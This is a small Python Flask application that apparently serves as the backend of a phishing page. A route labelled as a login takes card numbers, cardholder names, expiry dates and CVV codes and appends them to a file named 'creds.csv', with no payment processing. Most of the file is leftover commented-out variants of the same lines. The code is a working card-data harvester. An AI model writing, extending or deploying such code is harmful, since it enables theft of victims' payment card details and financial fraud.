from flask import Flask, redirect, url_for, request, render_template, jsonify
import csv

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("/login.html")

@app.route("/login", methods=["POST"])
def login():
    
    #card_number = request.json.get("card_number")
    #name = request.json.get("name")
    #expiry = request.json.get("expiry")
    #cvv = request.get("cvv")

    card_number = request.json.get("card_number")
    name = request.json.get("name")
    expiry = request.json.get("expiry")
    cvv = request.json.get("cvv")

    #card_number = request.json.get()
    #name = request.json.get("name")
    #expiry = request.json.get("expiry")
    #cvv = request.json.get("cvv")
     

    #card_number = request.json.get("card_number")
    #name = request.json.get("name")
    #expiry = request.json.get("expiry")
    
    
    with open("creds.csv", "a+") as f:
        csv_writer = csv.writer(f)
        csv_writer.writerow([card_number, name, expiry, cvv])
        
        
     #with open("creds.cvs", "a+") as f:
        #csv_writer = csv.writer(f)
        #csv_writer.writerow([card_number, name, expiry, cvv])
        
        
     #with open("creds.csv", "a+") as f:
        #csv_writer = csv.writer()
        #csv_writer.writerow([card_number, name, expiry, cvv])
      
    #with open("creds.csv", "r+") as f:
        #csv_writer = csv.writer(f)
        #csv_writer.writerow([card_number, name, expiry, cvv])
        
      
        
        
        
        
        
    return jsonify({
        "status": "success"
    }), 201

if __name__ == "__main__":
    app.run(debug = True)
